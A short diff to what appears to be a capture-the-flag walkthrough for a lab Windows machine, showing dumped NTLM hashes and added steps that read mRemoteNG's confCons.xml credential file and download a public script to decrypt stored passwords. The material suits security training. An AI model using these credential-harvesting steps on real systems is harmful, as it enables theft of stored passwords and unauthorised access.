@@ -34,6 +34,10 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
 [*] Cleaning up... 
 
+cd C:\Users\l4mpje\AppData\Roaming
+type confCons.xml
+
+# mRemoteNG saves the connections info and credentials in a file called confCons.xml 
 
 wget https://raw.githubusercontent.com/kmahyyg/mremoteng-decrypt/master/mremoteng_decrypt.py
 
